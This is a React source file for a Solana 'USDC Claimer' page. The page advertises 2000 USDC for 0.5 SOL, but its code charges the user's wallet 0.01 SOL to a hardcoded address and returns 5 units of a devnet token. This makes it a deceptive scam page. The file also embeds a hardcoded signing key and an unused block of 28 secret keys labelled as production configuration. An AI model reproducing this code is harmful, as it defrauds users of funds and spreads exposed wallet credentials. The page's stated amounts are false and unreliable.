/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3qMezjijZRNK5kJMa3goQTN2WR4XKPfSjHRgbndsNTaGyP3t7LCXCmKmduyCVgowEHb23StPNcTgYoUZwzoeTMsj"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4wECZPuQ4VH3ztBCzEBck3PQdZSRJxdfCAg7Me2P63nhHGB7WFni2ry64MdWAXM79PUhwHrvkX156iCwSk9uwyzM",
  "key1": "4htf6Z7b9cATP7VuBHWn4yUxWu55amTkRVLcKswGW6FyqNsXdtJ4WfeWFWVNJ1saT3cVfcAY7EBMnoVzHxwknyKN",
  "key2": "A6KLNSPQPc5yvTVmX5HZMCGvxHQ4wGhDYcuM5odioaF78TyxcnvKcZJAnhkK3CVxz3mV6954J8TMetHNrZEupPz",
  "key3": "2eFqvqmVUF9FcGTJsbWTLbW66XYgoUUrVSP3wXNTWmakvvdcSBeA7gQWNB5tkmXxAEJNEjGwtZuVcMUtbKYCPJYJ",
  "key4": "3R76fGQseTvfQQeCyWqBtChBDzaE4EkSfBd79KWUqoXMyztNKfesTMTF5P6S8kwrwxD8MF14M56dneuPLCecYdbs",
  "key5": "4YmHYv7nPEzPSshwNXUYNf5XVhA25CxpGbxYQ2FgD9w9Zf4ZjwARAdVTfDtyN2vYE1fuZ1zo6cjbgU7SbtZmRvfs",
  "key6": "26aSKUNafRuSzUyNiakSH6X38LXxp4UQLzTMi2ZoD6kXoE5JcEvF8e6HXCByko1KwBsBPWGDR1kx1uKiB5BXzZYT",
  "key7": "4ij1WnA5P6nMYxqeMfatUVqKAakxt918Yum4eAzTZMPvdbGxFGBsmpJGWHFtVL31wUjQpseX2c8Hj1ZH5G2guoSG",
  "key8": "w2QomQ3rcTEdnScWxGTR1CftxNCwBkdvo3NmBaoj8bXUgzed8AMmGmoUfxEaS22KDvBd3gLZhCQed8fBG8rMrKR",
  "key9": "58V9dTZony76C6wJGqK5bX7VVuB61vy7Hz4mQ5KAkzDAaGqVB586adFCW2hhq1GbpCXUUNEh3tkDLqpVx4Lkskts",
  "key10": "2kgVYxu2sKwryxSCbqJNBFAca9yHm2DqAmAYqBaQdzQBBqmokWG5SimitYxd9Dbujx6KHcTvN8r1Q7of7ivdBPaX",
  "key11": "2YSEFTJng8bmXhEjH5dvLzvuuj19wakMhXNQuqhgsBN7YSSMDorWMweHYQqe1qVKiXzf3NmykKUyT1SenSehkmix",
  "key12": "3VRAjwtuqoZwRWzC1CrCDcapkfFdHAbekxpz2Kx25tDNNgBfdPZAWG5nsBnZSQ3Q8jHEqWz353T5QrcKy9CG5ESr",
  "key13": "2BDvzCSfHPs1CQm6Tn3H6fuKjRNJCZbBgXPc1Y1XpGkWSrgA8wTeYXxZrnHgxYZyCPe7JGMah3d2k65g8jM3RnEf",
  "key14": "Na2mQgsdXMFCNcBmurBBLcHZdYQhyvjYoEhEWgzGXGhXJCvSVvowc6zer9k3kruDfHWHhjrcgDQc33JYNHuuyHJ",
  "key15": "4KMExvzviJrCUbsjyMPDnpG3VCANVDYrp5GWhzKEN6aumuMKDByT2k6fucRLQ7HwY6rTpCkcrc4UsRbY9uMyugai",
  "key16": "2WVVt86CNUUCgJPsBZFkFVNLMRx3a5Kn93Zq2zfpTLqV2Q6KYmb9ZBYBjZxCs9ZzY6u723ww7UWVVAbVyCzrhyRZ",
  "key17": "24fKGMxrpSfJVEs5RVupfMNdEQrqtqnLojaA3DYUkTWH2HLq5rVvRb8KQEgx1ufnKBu2ruf4oD4mNXCTY27FVTwV",
  "key18": "HV5maTX7Cj5En7Qcj1shnJqojvnyBrpUHUr2SPqbzpjvFBCBzdhs3wkGu8txwmjj96vbcAW15CQ48rgT7UEXBTJ",
  "key19": "jQvmtwPvZJRHVHH1ZYEDZpajfQ84UQedTey4LMWAxkMGFcApYFvK3sshQpCH7VV2V5G1Bgg5eT8UNU3gxNeJmxA",
  "key20": "5TysapzKABPrFFzmQCLr9Ntt1XMvD76pzHsWVmRyn7BgHGnNPRQLP9HQCdf5FJaac91wZu73RPvnd3tEet2d1AP6",
  "key21": "4jYrBcTZzLVEuu9wgDj5ncaWejR6zXrLd79Bx1pgKj5J6J45eb7wmCZxaUXWZQd21EqvAdc91i6YB8y7b4TW9JSt",
  "key22": "65PHZ2XRjQC9r1NCyaW2ws4u5XA19grWg6cscCQyjwxAjJUHqvx8VNq6Xrf8xkeA2A74HNUAvDurQN7Y6bXsuMRF",
  "key23": "2ojXB2WMqo4ud491D31eoNWyUmRLx3NNWAXYincFQaq3LWHukJboZ6sZwD1LCxkcV2agkmzwmKHEJmFF6ZHXHPK1",
  "key24": "3vESPinZmbAFFtcHNaBtWUPzMk1iLZ8xx3jxiqfzuxYKiujdxqM7EzxNB1UPuqyZLU8MBZsxBLimukrNw1Swquze",
  "key25": "5ZGjw22bx7hMVTSEMvgmhpWcxkKpDWE8PCGeZNxD9fvqgaCKUQTs6sbX54gnDoir6WddivX27qvA2zxnB5LbhBEF",
  "key26": "D5eWeVvXihibUtYYxfq2n1J7d9NYNZsfvdP8cbve6ywvMhPe6CQ2ZrQc78i5KfGt7t7bwwcFLcCvhces232MHnd",
  "key27": "5qX9tcgReT6TUbtLrEH7GHTrqQHXQLc6zapm1omUJoYkJQbUjTiix6DUQcu1fbwBK28R3uT61PDbet1pkPasASGC"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
